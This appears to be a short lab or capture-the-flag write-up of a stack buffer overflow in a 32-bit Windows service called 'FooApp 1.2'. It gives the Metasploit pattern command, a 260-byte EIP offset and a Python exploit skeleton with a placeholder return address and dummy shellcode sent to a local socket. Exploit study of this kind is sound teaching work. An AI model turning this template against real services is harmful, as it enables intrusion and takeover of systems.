---
title: "Stack Buffer Overflow in FooApp 1.2"
date: 2024-03-10
tags: [pwn, bof, windows]
difficulty: medium
source: local
excerpt: "Classic stack smash in a 32-bit Windows service. No ASLR, no DEP. EIP control in 10 minutes."
---

## Overview

FooApp 1.2 exposes a named pipe that accepts user input without bounds checking on the receive buffer. Classic stack smash — 32-bit, no ASLR, no DEP.

## Finding the Offset

Pattern generation with Metasploit:

```bash
msf-pattern_create -l 500
```

Attach x32dbg, send the pattern, read EIP at crash: `0x41386241`. Offset at 260 bytes.

## Exploit

```python
import socket, struct

TARGET = ('127.0.0.1', 9999)
EIP    = struct.pack('<I', 0xDEADBEEF)  # replace with JMP ESP gadget
NOP    = b'\x90' * 16
SHELL  = b'\xcc' * 100  # replace with actual shellcode

payload = b'A' * 260 + EIP + NOP + SHELL

s = socket.socket()
s.connect(TARGET)
s.send(payload)
s.close()
```

## Result

EIP control confirmed. Shell spawned as SYSTEM.
